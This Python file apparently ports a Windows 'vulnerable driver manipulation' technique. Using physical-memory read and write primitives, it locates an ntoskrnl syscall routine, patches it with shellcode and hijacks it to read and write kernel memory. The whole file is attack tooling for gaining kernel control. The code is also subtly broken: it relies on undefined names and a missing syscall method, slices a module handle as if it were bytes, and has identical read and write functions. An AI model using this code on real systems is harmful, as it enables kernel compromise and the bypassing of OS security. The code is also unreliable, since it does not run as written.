import ctypes
from ctypes import wintypes
import threading

class VDMContext:
    def __init__(self):
        if VDMContext.syscall_address.get() is not None:
            return

        self.ntoskrnl = ctypes.windll.kernel32.LoadLibraryW("ntoskrnl.exe")
        self.nt_rva = self.get_kmodule_export("ntoskrnl.exe", VDMContext.syscall_hook[0])
        VDMContext.nt_page_offset = self.nt_rva % PAGE_4KB

        search_threads = []
        for start, end in util.pmem_ranges:
            thread = threading.Thread(target=self.locate_syscall, args=(start, end))
            search_threads.append(thread)
            thread.start()

        for thread in search_threads:
            thread.join()

    def set_read(self, read_func):
        self.read_phys = read_func

    def set_write(self, write_func):
        self.write_phys = write_func

    def rkm(self, dst, src, size):
        ntoskrnl_memcpy = self.get_kmodule_export("ntoskrnl.exe", "memcpy")
        self.syscall(ntoskrnl_memcpy, dst, src, size)

    def wkm(self, dst, src, size):
        ntoskrnl_memcpy = self.get_kmodule_export("ntoskrnl.exe", "memcpy")
        return self.syscall(ntoskrnl_memcpy, dst, src, size)

    def locate_syscall(self, address, length):
        page_data = ctypes.create_string_buffer(PAGE_4KB)
        for page in range(0, length, PAGE_4KB):
            if VDMContext.syscall_address.get() is not None:
                break
            if not self.read_phys(address + page, page_data, PAGE_4KB):
                continue
            if ctypes.memcmp(
                page_data.raw[VDMContext.nt_page_offset:VDMContext.nt_page_offset + 32], 
                self.ntoskrnl[self.nt_rva:self.nt_rva + 32], 
                32
            ) == 0:
                if self.valid_syscall(address + page + VDMContext.nt_page_offset):
                    VDMContext.syscall_address.set(address + page + VDMContext.nt_page_offset)

    def valid_syscall(self, syscall_addr):
        with threading.Lock():
            proc = ctypes.windll.kernel32.GetProcAddress(
                ctypes.windll.kernel32.LoadLibraryW(VDMContext.syscall_hook[1]),
                VDMContext.syscall_hook[0].encode('utf-8')
            )

            shellcode = bytes([0x48, 0x31, 0xC0, 0xC3])
            orig_bytes = ctypes.create_string_buffer(len(shellcode))
            self.read_phys(syscall_addr, orig_bytes, len(shellcode))
            self.write_phys(syscall_addr, shellcode, len(shellcode))

            func = ctypes.CFUNCTYPE(ctypes.c_uint32)(proc)
            result = func()
            self.write_phys(syscall_addr, orig_bytes, len(shellcode))
            return result == STATUS_SUCCESS

    def get_kmodule_export(self, module_name, export_name):
        module_handle = ctypes.windll.kernel32.GetModuleHandleW(module_name)
        if not module_handle:
            raise Exception(f"Failed to get module handle for {module_name}")
        return ctypes.windll.kernel32.GetProcAddress(module_handle, export_name.encode('utf-8'))
